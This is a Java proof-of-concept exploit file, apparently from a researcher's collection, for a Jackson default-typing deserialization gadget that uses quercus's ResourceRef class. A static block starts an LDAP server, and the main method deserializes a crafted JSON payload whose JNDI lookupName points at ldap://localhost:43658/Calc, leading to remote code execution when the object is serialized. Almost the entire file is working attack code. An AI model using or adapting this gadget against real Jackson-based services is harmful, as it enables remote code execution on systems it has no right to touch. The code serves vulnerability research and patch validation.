package com.threedr3am.bug.jackson.rce;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;
import com.threedr3am.bug.common.server.LdapServer;
import java.io.IOException;

/**
 * 比较鸡肋，需要调用writeValueAsString才能触发
 *
 * quercus ResourceRef jndi gadget
 *
 * <dependency>
 *       <groupId>com.caucho</groupId>
 *       <artifactId>quercus</artifactId>
 *       <version>4.0.63</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class QuercusPoc {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws IOException {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();

    String json = "[\"com.caucho.config.types.ResourceRef\", {\"lookupName\": \"ldap://localhost:43658/Calc\"}]";
    Object o = mapper.readValue(json, Object.class);
    mapper.writeValueAsString(o);
  }


}
